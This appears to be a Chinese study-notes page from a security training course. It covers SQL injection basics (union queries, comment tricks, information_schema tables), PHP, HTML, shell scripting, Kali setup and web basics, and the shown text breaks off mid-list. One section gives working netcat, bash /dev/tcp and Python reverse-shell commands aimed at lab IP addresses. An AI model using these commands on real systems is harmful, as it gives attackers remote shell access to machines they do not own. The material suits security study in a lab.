<p>4.联合查询：</p>
<p>语法：<code>select</code> 语句1 <code>union select</code> 语句2；（要求：语句1和语句2查询字段数一样！！！） </p>
<p>5.注释符：<br>单行注释：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line">-- （不要忽略--后面的空格）（在url中输入可以输入--+）</span><br></pre></td></tr></table></figure>
<p>多行注释：<br><code>/*     */</code></p>
<p>6.<code>information_schema</code>数据库<br>三个重点表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">schemata        数据库相关信息，show databases就是从这个表中得到的结果,它的重点字段是：schema_name</span><br><span class="line"></span><br><span class="line">tables              数据表的相关信息，它的重点字段table_name存的是表名  另一个重点字段table_schema用来存它属于哪个数据库</span><br><span class="line"></span><br><span class="line">columns          列信息，第一个重点字段table_schema ,第二个重点字段：table_name ，            column_name:列的名字</span><br></pre></td></tr></table></figure>

<h2 id="五、编程语言类"><a href="#五、编程语言类" class="headerlink" title="五、编程语言类"></a>五、编程语言类</h2><h3 id="一、单引号和双引号"><a href="#一、单引号和双引号" class="headerlink" title="一、单引号和双引号"></a>一、单引号和双引号</h3><ol>
<li>单引号原样输出</li>
<li>双引号可以识别变量和转义。</li>
</ol>
<h3 id="二、变量名命名规则"><a href="#二、变量名命名规则" class="headerlink" title="二、变量名命名规则"></a>二、变量名命名规则</h3><p>变量名由英文字母，数字和下划线构成，首个字符不能以数字开头，中间不能有空格 。</p>
<h3 id="三、数组下标"><a href="#三、数组下标" class="headerlink" title="三、数组下标"></a>三、数组下标</h3><p>数组元素的下标由0开始。</p>
<h3 id="四、break和continue"><a href="#四、break和continue" class="headerlink" title="四、break和continue"></a>四、break和continue</h3><p>break:      跳出整个循环<br>continue:   跳出当前循环</p>
<h3 id="五、不同等号的含义"><a href="#五、不同等号的含义" class="headerlink" title="五、不同等号的含义"></a>五、不同等号的含义</h3><p>=       赋值运算符，将等号右边的赋值给左边</p>
<p>==     判断左右两边值是否相等</p>
<p>===    判断左右两边值和类型是否均相等</p>
<h3 id="六、逻辑运算"><a href="#六、逻辑运算" class="headerlink" title="六、逻辑运算"></a>六、逻辑运算</h3><p>与运算：两者均为真则结果为真</p>
<p>或运算：两者其一为真，则结果为真。</p>
<p>非运算：本身为真，取非为假，反之本身为假，取非为真。</p>
<h2 id="六、HTML"><a href="#六、HTML" class="headerlink" title="六、HTML"></a>六、HTML</h2><h3 id="1-基本框架"><a href="#1-基本框架" class="headerlink" title="1.基本框架"></a>1.基本框架</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;标题&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="2-常用标签"><a href="#2-常用标签" class="headerlink" title="2.常用标签"></a>2.常用标签</h3><p>需要闭合</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;    段落</span><br><span class="line">&lt;h1&gt;…&lt;h6&gt;   标题</span><br><span class="line">&lt;a href&#x3D;””&gt;    超链接</span><br><span class="line">&lt;image src&#x3D;””&gt; 图片</span><br><span class="line">&lt;table&gt; &lt;tr&gt;&lt;td&gt; 表格相关标签</span><br><span class="line">&lt;div&gt;   块标签</span><br><span class="line">&lt;form&gt; &lt;input&gt; 表单相关标签</span><br><span class="line">&lt;b&gt; 字体加粗  &lt;i&gt;字体倾斜</span><br><span class="line">&lt;script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">不需要闭合</span><br><span class="line">&lt;hr&gt;   横线</span><br><span class="line">&lt;br&gt;   换行</span><br></pre></td></tr></table></figure>

<h2 id="七、nc及Linux反弹shell"><a href="#七、nc及Linux反弹shell" class="headerlink" title="七、nc及Linux反弹shell"></a>七、nc及Linux反弹shell</h2><h3 id="NC远程控制"><a href="#NC远程控制" class="headerlink" title="NC远程控制"></a>NC远程控制</h3><p>正向：<br>A: <code>nc -lp 333 -c bash</code><br>B: <code>nc -nv 192.168.239.140 333</code></p>
<p>反向：<br>A: <code>nc -lp 333</code><br>B: <code>nc –nv 192.168.239.140 333 -c bash</code></p>
<h3 id="Linux反弹shell"><a href="#Linux反弹shell" class="headerlink" title="Linux反弹shell"></a>Linux反弹shell</h3><p>方式一：<br>攻击机：<code>nc -lvp 8888</code></p>
<p>被攻击机：<code>bash -i &gt;&amp; /dev/tcp/192.168.239.140/8888 0&gt;&amp;1</code></p>
<p>方式二：<br>攻击机：<code>nc -lvp 8888</code><br>被攻击机：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;192.168.239.130&#39;,8888));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&#39;&#x2F;bin&#x2F;bash&#39;,&#39;-i&#39;])&quot;</span><br></pre></td></tr></table></figure>

<h2 id="八、PHP"><a href="#八、PHP" class="headerlink" title="八、PHP"></a>八、PHP</h2><h3 id="1-注释符"><a href="#1-注释符" class="headerlink" title="1.注释符"></a>1.注释符</h3><p>单行注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;   </span><br><span class="line">#</span><br></pre></td></tr></table></figure>
<p>多行注释</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;* ……*&#x2F;</span><br></pre></td></tr></table></figure>
<h3 id="2-语句分隔符"><a href="#2-语句分隔符" class="headerlink" title="2.语句分隔符"></a>2.语句分隔符</h3><p><code>；</code></p>
<h3 id="3-变量语法规则"><a href="#3-变量语法规则" class="headerlink" title="3.变量语法规则"></a>3.变量语法规则</h3><p>声明和使用时都需要加<code>$</code></p>
<h3 id="4-变量传值"><a href="#4-变量传值" class="headerlink" title="4.变量传值"></a>4.变量传值</h3><p>值传递</p>
<blockquote>
<p>将变量保存的值复制一份，然后将新的值给另外一个变量保存（两个变量没有关系）</p>
</blockquote>
<p>引用传递</p>
<blockquote>
<p>将变量保存的值所在的内存地址，传递给另外一个变量：两个变量指向同一块内存空间（两个变量是同一个值）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$新变量 &#x3D; &amp;$老变量;</span><br></pre></td></tr></table></figure>

<h3 id="5-选择循环结构"><a href="#5-选择循环结构" class="headerlink" title="5.选择循环结构"></a>5.选择循环结构</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if(条件表达式1)&#123;</span><br><span class="line">	&#x2F;&#x2F;满足条件表达式1的代码段;</span><br><span class="line">&#125;elseif(条件表达式2)&#123;</span><br><span class="line">	&#x2F;&#x2F;不满足表达式1条件，但是满足表达式2的代码;</span><br><span class="line">&#125;…	&#x2F;&#x2F;可以使用多个elseif来进行再次条件筛选</span><br><span class="line">else&#123;</span><br><span class="line">	&#x2F;&#x2F;全部不满足要执行的代码;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>条件表达式==和=不相同！！！</p>
<h4 id="switch"><a href="#switch" class="headerlink" title="switch"></a>switch</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">switch(条件表达式)&#123;</span><br><span class="line">	case 值1:					</span><br><span class="line">		要执行的代码段;</span><br><span class="line">		break;					</span><br><span class="line">	case 值2:</span><br><span class="line">		要执行的代码段;</span><br><span class="line">		break;</span><br><span class="line">	…</span><br><span class="line">	default:</span><br><span class="line">		&#x2F;&#x2F;匹配失败的代码;</span><br><span class="line">		break;</span><br><span class="line">&#125;</span><br><span class="line">不要忘了写break</span><br></pre></td></tr></table></figure>

<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for(条件表达式1;条件表达式2;条件表达式3)&#123;</span><br><span class="line">	&#x2F;&#x2F;条件表达式1：定义初始化条件，可以有多种赋值语句存在，使用逗号分隔即可</span><br><span class="line">	&#x2F;&#x2F;条件表达式2：边界判定，限定循环执行的次数</span><br><span class="line">	&#x2F;&#x2F;条件表达式3：用来执行条件变化（自操作）</span><br><span class="line">	&#x2F;&#x2F;循环体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while(条件表达式)&#123;</span><br><span class="line">	&#x2F;&#x2F;条件表达式就是判断边界条件</span><br><span class="line">	循环体;		&#x2F;&#x2F;循环条件的变化</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="do-while"><a href="#do-while" class="headerlink" title="do while"></a>do while</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do&#123;</span><br><span class="line">	&#x2F;&#x2F;循环体</span><br><span class="line">&#125;while(条件表达式);</span><br><span class="line"></span><br><span class="line">do-while当条件不满足，循环会执行一次，while循环一次不执行。</span><br></pre></td></tr></table></figure>

<h4 id="break和continue进阶使用"><a href="#break和continue进阶使用" class="headerlink" title="break和continue进阶使用"></a>break和continue进阶使用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">continue 2; 跳出x层循环，但继续循环</span><br><span class="line"></span><br><span class="line">break 2; 跳出x层循环，停止循环</span><br></pre></td></tr></table></figure>

<h3 id="6-include和require"><a href="#6-include和require" class="headerlink" title="6.include和require"></a>6.include和require</h3><p>四种包含方式区别</p>
<ul>
<li><p><code>include</code>：出现一次包含一次，如包含不到不影响后面代码执行</p>
</li>
<li><p><code>include_once</code>：包含前先判断是否曾包含过，如包含过则不重复包含。</p>
</li>
<li><p><code>require</code>：出现一次包含一次，如包含不到则会报错，终止代码执行</p>
</li>
<li><p><code>require_once</code>：和include_once相同</p>
</li>
</ul>
<p>语法格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include ‘文件名字’;</span><br></pre></td></tr></table></figure>

<p>嵌套包含</p>
<blockquote>
<p>包含的时候推荐使用绝对路径</p>
</blockquote>
<h3 id="7-函数"><a href="#7-函数" class="headerlink" title="7.函数"></a>7.函数</h3><p>语法格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function 函数名([形参])&#123;</span><br><span class="line">	&#x2F;&#x2F;函数体</span><br><span class="line">	&#x2F;&#x2F;返回值：return 结果;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>调用方式：<code>函数名(实参)</code></p>
<blockquote>
<p>函数的调用可以在函数定义之前</p>
</blockquote>
<h4 id="形参和实参"><a href="#形参和实参" class="headerlink" title="形参和实参"></a>形参和实参</h4><ul>
<li>形参：函数在定义的时候圆括号中的参数</li>
<li>实参：函数在调用的时候传递的实际参数，可以是具体的值也可以是变量。</li>
</ul>
<ol>
<li><p>在PHP中允许实参多于形参（个数）：函数内部不用而已</p>
</li>
<li><p>在PHP中理论上形参个数没有限制（实际开发不会太多）</p>
</li>
<li><p>实参不能少于形参个数</p>
</li>
</ol>
<p>默认值</p>
<blockquote>
<p>默认值的定义是放在最右边的（多个），不能左边形参有默认值，但是右边没有</p>
</blockquote>
<h4 id="引用传值"><a href="#引用传值" class="headerlink" title="引用传值"></a>引用传值</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Function 函数名(形参1,&amp;形参2)&#123;</span><br><span class="line">	&#x2F;&#x2F;函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用的时候引用传值形参对应的实参不需要写“&amp;”。</p>
</blockquote>
<blockquote>
<p>引用传值形参对应的实参必须是变量，不能写具体的值。</p>
</blockquote>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><blockquote>
<p>（函数调用处）：在PHP中所有的函数都有返回值。（<strong>如果没有明确return使用，那么系统默认返回NULL</strong>）</p>
</blockquote>
<h4 id="return关键字"><a href="#return关键字" class="headerlink" title="return关键字"></a>return关键字</h4><ol>
<li><p>return在函数内部存在的价值：返回当前函数的结果（当前函数运行结束）</p>
</li>
<li><p>return还可以在文件中直接使用（不在函数里面）：代表文件将结果return后面跟的内容，转交给包含当前文件的位置。在文件中也代表中终止文件后面的代码：return之后的内容不会执行。</p>
</li>
</ol>
<h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><blockquote>
<p>$GLOBALS 这是一个超全局变量，在函数内和函数外均可访问，其中全局变量会被存入该数组，可以通过对应的数组下标实现函数内访问外部全局变量。</p>
</blockquote>
<blockquote>
<p>global 它可以实现函数内访问外部全局变量，也可以外部访问函数内局部变量。它的本质：在函数的内部和外部，对一个同名变量（全局和局部）使用同一块内存地址保存数据，从而实现共同拥有。</p>
</blockquote>
<p>基本语法：</p>
<ul>
<li>global 变量名;    //不能赋值</li>
<li>变量名 = 值;        //修改</li>
</ul>
<h4 id="静态变量"><a href="#静态变量" class="headerlink" title="静态变量"></a>静态变量</h4><blockquote>
<p>函数运行结束所有局部变量都会清空，如果重新运行一下函数，所有的局部变量又会重新初始化。但静态变量会保留之前状态。</p>
</blockquote>
<h4 id="可变函数"><a href="#可变函数" class="headerlink" title="可变函数"></a>可变函数</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$变量 &#x3D; ‘display’;                              </span><br><span class="line">function display()&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;可变函数</span><br><span class="line">$变量();</span><br></pre></td></tr></table></figure>
<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p>基本语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">变量名 &#x3D; function()&#123;</span><br><span class="line">	函数体</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="8-数组"><a href="#8-数组" class="headerlink" title="8.数组"></a>8.数组</h3><p>三种定义方式</p>
<ol>
<li>使用array关键字：最常用的<ul>
<li>$变量 = array(元素1,元素2,元素3..);      </li>
</ul>
</li>
<li>可以使用中括号来包裹数据：<ul>
<li>$变量 = [元素1,元素2…];</li>
</ul>
</li>
<li>隐形定义数组：给变量增加一个中括号，系统自动变成数组<ul>
<li>$变量[] = 值1;    //如果不提供下标也可以，系统自动生成（数字：从0开始）</li>
<li>$变量[下标] = 值;    //中括号里面的内容称之为下标key，该下标可以是字母（单词）或者数字，与变量命名的规则相似</li>
</ul>
</li>
</ol>
<h4 id="数组特点"><a href="#数组特点" class="headerlink" title="数组特点"></a>数组特点</h4><ol>
<li>数组元素的顺序以放入顺序为准，跟下标无关</li>
<li>数字下标的自增长特性：从0开始自动增长，如果中间手动出现较大的，那么后面的自增长元素从最大的值+1开始</li>
<li>当后面的元素下标和前面的相同，会覆盖前面的元素。</li>
</ol>
<h4 id="foreach遍历数组"><a href="#foreach遍历数组" class="headerlink" title="foreach遍历数组"></a>foreach遍历数组</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">foreach($数组变量 as [$下标 &#x3D;&gt;] $值)&#123;</span><br><span class="line">	&#x2F;&#x2F;通过$下标访问元素的下标；通过$值访问元素的值</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="9-表单传值"><a href="#9-表单传值" class="headerlink" title="9.表单传值"></a>9.表单传值</h3><h4 id="get方式"><a href="#get方式" class="headerlink" title="get方式"></a>get方式</h4><p>1）form表单</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method&#x3D;”GET”&gt;表单元素&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>
<p>2）url</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.itcast.cn&#x2F;index.php?学科&#x3D;PHP</span><br></pre></td></tr></table></figure>
<h4 id="post方式"><a href="#post方式" class="headerlink" title="post方式"></a>post方式</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method&#x3D;”POST”&gt;表单元素&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>get传输数据可以在URL中对外可见，而post不可见：GET传值最终会在浏览器的地址栏中全部显示：?数据名=数据值&amp;数据名2=数据值2…</p>
</blockquote>
<p>接受数据的三种超全局变量</p>
<ul>
<li>$_GET方式：接收GET方式提交的数据</li>
<li>$_POST方式：接收POST方式提交的数据</li>
<li>$_REQUEST方式：接收POST或者GET提交的所有数据</li>
</ul>
<h3 id="10-文件上传"><a href="#10-文件上传" class="headerlink" title="10.文件上传"></a>10.文件上传</h3><p>1）method属性：表单提交方式必须为POST          //$_POST数组中有上传文件内容吗？ </p>
<p>2）<strong>enctype属性</strong>(必须写：form表单属性，主要是规范表单数据的编码方式</p>
<h4 id="上传表单写法"><a href="#上传表单写法" class="headerlink" title="上传表单写法"></a>上传表单写法</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;form method&#x3D;&quot;POST&quot; enctype&#x3D;&quot;multipart&#x2F;from-data action&#x3D;&quot;upload.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;image&quot; &#x2F;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;btn&quot; value&#x3D;&quot;upload file&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;form&gt;</span><br></pre></td></tr></table></figure>

<h4 id="FILES"><a href="#FILES" class="headerlink" title="$_FILES"></a>$_FILES</h4><ol>
<li>name：文件在用户（浏览器端）电脑上实际存在的名字（实际用来保留后缀）</li>
<li>tmp_name：文件上传到服务器后操作系统保存的临时路径（实际用来给PHP后期使用）</li>
<li>type：MIME（多功能互联网邮件扩展）类型，用来在计算机中客户端识别文件类型（确定软件）</li>
<li>error：文件上传的代号，用来告知应用软件（PHP）文件接收过程中出现了什么问题（PHP后期根据代码进行文件判断） </li>
<li>size：文件大小（PHP根据实际需求来确定是否该保留）</li>
</ol>
<p>文件上传中用到的两个重要函数</p>
<ol>
<li><p>判断是否为上传的文件：is_uploaded_file()</p>
</li>
<li><p>移动文件：move_uploaded_file()</p>
</li>
</ol>
<h3 id="11-PHP操作数据库"><a href="#11-PHP操作数据库" class="headerlink" title="11.PHP操作数据库"></a>11.PHP操作数据库</h3><h4 id="重要函数"><a href="#重要函数" class="headerlink" title="重要函数"></a>重要函数</h4><ul>
<li>mysqli_connect() 函数: 打开一个到 MySQL 服务器的新的连接。</li>
</ul>
<p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_connect(host,username,password,dbname,port,socket);</span><br><span class="line"></span><br><span class="line">host	           规定主机名或 IP 地址。</span><br><span class="line">Username        规定 MySQL 用户名。</span><br><span class="line">Password         规定 MySQL 密码。</span><br><span class="line">dbname	           规定默认使用的数据库。</span><br><span class="line">port	           规定尝试连接到 MySQL 服务器的端口号。</span><br></pre></td></tr></table></figure>

<ul>
<li><p>mysqli_close($conn)中断MySQL服务器的连接</p>
</li>
<li><p>mysqli_query() 函数执行某个针对数据库的查询。</p>
</li>
</ul>
<p>语法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_query(connection,query,resultmode);</span><br><span class="line">connection	必需。规定要使用的 MySQL 连接。</span><br><span class="line">query	             必需，规定查询字符串。</span><br></pre></td></tr></table></figure>

<ul>
<li>mysqli_num_rows()返回结果集中行的数量</li>
</ul>
<p>语法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysqli_num_rows($result);</span><br></pre></td></tr></table></figure>

<ul>
<li>mysqli_fetch_assoc()从结果集中取得一行作为关联数组</li>
<li>mysqli_fetch_array()从结果集中取得一行作为索引数组或关联数组，或两者兼有</li>
</ul>
<h1 id="B级别-一般知识点"><a href="#B级别-一般知识点" class="headerlink" title="B级别:一般知识点"></a>B级别:一般知识点</h1><h2 id="一、网络安全法"><a href="#一、网络安全法" class="headerlink" title="一、网络安全法"></a>一、网络安全法</h2><ol>
<li>违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</li>
</ol>
<h2 id="二、虚拟机："><a href="#二、虚拟机：" class="headerlink" title="二、虚拟机："></a>二、虚拟机：</h2><h3 id="1-做快照"><a href="#1-做快照" class="headerlink" title="1.做快照"></a>1.做快照</h3><pre><code>(1)运行状态下做快照
(2)关机状态下做快照
建议虚拟机装好后配置好相应的环境及安装好相应工具后做个快照。</code></pre><h3 id="2-做克隆"><a href="#2-做克隆" class="headerlink" title="2.做克隆"></a>2.做克隆</h3><pre><code>(1)链接克隆   占用硬盘空间少，建立速度快，但克隆母体删掉或损坏会影响链接克隆。
(2)完全克隆   占用硬盘空间多，建立速度慢，但独立于克隆母体。</code></pre><h2 id="三、Linux"><a href="#三、Linux" class="headerlink" title="三、Linux"></a>三、Linux</h2><h3 id="1-linux发行版概念"><a href="#1-linux发行版概念" class="headerlink" title="1.linux发行版概念"></a>1.linux发行版概念</h3><p>Linux只定义/实现了一个内核。内核必须同命令、守护进程以及其他软件一起打包来组成一个可以使用的完整操作系统，这种打包就是Distribution，中文一般称为发行版本。</p>
<h3 id="2-kali初始设置"><a href="#2-kali初始设置" class="headerlink" title="2.kali初始设置"></a>2.kali初始设置</h3><p>以<code>root</code>登录</p>
<p><code>sudo passwd root</code>修改<code>root</code>密码</p>
<p>重启后以<code>root</code>身份登录</p>
<p>更新源：<br><code>vim /etc/apt/sources.list</code> 在末尾加入下列源</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#阿里云</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">deb http:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>
<p>换完源之后在终端输入：<code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
<p>更新源和更新软件<br>命令：<code>apt-get update &amp;&amp; apt-get upgrade &amp;&amp; apt-get clean</code></p>
<p><strong>Kali2020官方教程中建议使用<code>apt</code></strong></p>
<p><code>apt-get update</code><br>只更新软件包的索引源，作用是同步源的软件包的索引信息，从而进行软件更新。<br><code>apt-get upgrade</code><br>升级系统上安装的所有软件包，所更新失败，所涉及的包会保持更新之前的状态。<br><code>apt-get clean</code><br>把已安装的软件包的安装包删除掉。</p>
<h3 id="Kali开启ssh"><a href="#Kali开启ssh" class="headerlink" title="Kali开启ssh"></a>Kali开启ssh</h3><ol>
<li>vim /etc/ssh/sshd_config</li>
</ol>
<p>(1) 允许root登录 <code>permitrootlogin  yes</code></p>
<p>(2) 允许密码登录 <code>#PasswordAuthentication no</code></p>
<ol start="2">
<li><p>重启ssd服务 <code>/etc/init.d/ssh restart</code></p>
</li>
<li><p>添加开机启动 <code>update-rc.d ssh enable</code> 或使用<code>systemctl enable ssh</code></p>
</li>
</ol>
<h2 id="四：数据库"><a href="#四：数据库" class="headerlink" title="四：数据库"></a>四：数据库</h2><ol>
<li>按照数据库规模分类</li>
</ol>
<p>小型关系型数据库：</p>
<ul>
<li>Microsoft Access</li>
<li>SQLite</li>
</ul>
<p>中型关系型数据库：</p>
<ul>
<li>SQL Server</li>
<li>Mysql</li>
</ul>
<p>大型关系型数据库：</p>
<ul>
<li>Oracle</li>
<li>DB2</li>
</ul>
<ol start="2">
<li>MySQL发展史</li>
</ol>
<p>AB公司被Sun公司收购—》Oracle又收购了Sun公司</p>
<h2 id="五、SHELL编程"><a href="#五、SHELL编程" class="headerlink" title="五、SHELL编程"></a>五、SHELL编程</h2><ol>
<li><p>shell指定解释器：<code>#!/bin/bash</code></p>
</li>
<li><p>脚本后缀没要求，但为了让别人知道脚本类型，推荐使用<code>.sh</code>作为后缀名</p>
</li>
<li><p>运行脚本前需要先赋予可执行权限。<code>./</code>文件名运行脚本</p>
</li>
<li><p>变量名和等号之间不能有空格</p>
</li>
<li><p>变量声明时不加<code>$</code>符号，但使用时需要加<code>$</code>符号。为了避免歧义，可以把变量名用花括号<code>{ }</code>括起来。</p>
</li>
<li><p><code>readonly</code>只读变量，不能改变变量值，不能用<code>unset</code>删除变量。</p>
</li>
<li><p><code>#</code>可以用来输出变量长度，</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#123;#string&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>获取文件名和后缀</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$&#123;string%.*&#125;</span><br><span class="line">$&#123;string#*.&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p># 注释符</p>
</li>
<li><p>运行脚本时可以传递参数，其中<code>$0</code>代表文件名，<code>$1…$n</code>代表第一个<code>…</code>第<code>n</code>个参数，<code>$10</code>及更大的数字需要用花括号把数字括起来。</p>
</li>
<li><p><code>$#</code>代表传递的参数个数，<code>$*</code>以及<code>$@</code>代表显示所有向脚本传递的参数。</p>
</li>
<li><p>shell脚本中<em>需要转义,写成`\</em>`</p>
</li>
<li><p>if结构   例如：（注意闭合if,以及结构中执行体内容不能为空）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [[ $a -lt 100 &amp;&amp; $b -gt 100 ]]</span><br><span class="line">then</span><br><span class="line">   echo &quot;返回 true&quot;</span><br><span class="line">else</span><br><span class="line">   echo &quot;返回 false&quot;</span><br><span class="line">fi</span><br></pre></td></tr></table></figure></li>
<li><p>echo -e “OK! \n” # -e 开启转义</p>
</li>
<li><p>printf可以格式化打印。</p>
</li>
<li><p>while condition</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">do</span><br><span class="line">    command</span><br><span class="line">done</span><br></pre></td></tr></table></figure></li>
<li><p>case</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case 值 in</span><br><span class="line">模式1)</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">模式2）</span><br><span class="line">    command1</span><br><span class="line">    command2</span><br><span class="line">    ...</span><br><span class="line">    commandN</span><br><span class="line">    ;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure></li>
<li><p>read 变量名 接收用户输入</p>
</li>
</ol>
<h2 id="六、CSS层叠样式表"><a href="#六、CSS层叠样式表" class="headerlink" title="六、CSS层叠样式表"></a>六、CSS层叠样式表</h2><p>1.层叠样式表三种使用方式<br>内联样式（标签内定义）</p>
<p>内部样式<br><code>&lt;head&gt;</code>标签内用<code>&lt;style&gt;</code>定义<br>如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">hr &#123;color:sienna;&#125;</span><br><span class="line">p &#123;margin-left:20px;&#125;</span><br><span class="line">body &#123;background-image:url(&quot;images&#x2F;back40.gif&quot;);&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>
<p>外部样式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;head&gt;标签中用&lt;link&gt;定义，外部样式文件以.css结尾</span><br><span class="line">如：</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; type&#x3D;&quot;text&#x2F;css&quot; href&#x3D;&quot;mystyle.css&quot;&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br></pre></td></tr></table></figure>
<h2 id="七、JavaScript"><a href="#七、JavaScript" class="headerlink" title="七、JavaScript"></a>七、JavaScript</h2><p>1.<code>Java</code>和<code>JavaScript</code>的关系</p>
<p><strong>两者没关系</strong></p>
<p>2.脚本所在位置</p>
<p>可以和html代码共存，用<code>&lt;script&gt;&lt;/script&gt;</code>标签界定代码边界。</p>
<p>3.函数</p>
<h3 id="一、定义语法"><a href="#一、定义语法" class="headerlink" title="一、定义语法"></a>一、定义语法</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function  函数名称()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">   具体代码……</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="二、全局变量和局部变量"><a href="#二、全局变量和局部变量" class="headerlink" title="二、全局变量和局部变量"></a>二、全局变量和局部变量</h3><p>局部变量：在函数内定义，只有函数内能访问<br>全局变量：函数外声明，所有脚本和函数都能访问。</p>
<h3 id="三、变量生命周期"><a href="#三、变量生命周期" class="headerlink" title="三、变量生命周期"></a>三、变量生命周期</h3><p>JavaScript 变量的生命期从它们被声明的时间开始。<br>局部变量会在函数运行以后被删除。<br>全局变量会在页面关闭后被删除。</p>
<h3 id="四、外部调用JS脚本"><a href="#四、外部调用JS脚本" class="headerlink" title="四、外部调用JS脚本"></a>四、外部调用JS脚本</h3><ol>
<li>外部脚本后缀名以.js结尾</li>
<li>外部脚本代码中不要再出现<code>&lt;script&gt;</code>标签，直接写脚本内容</li>
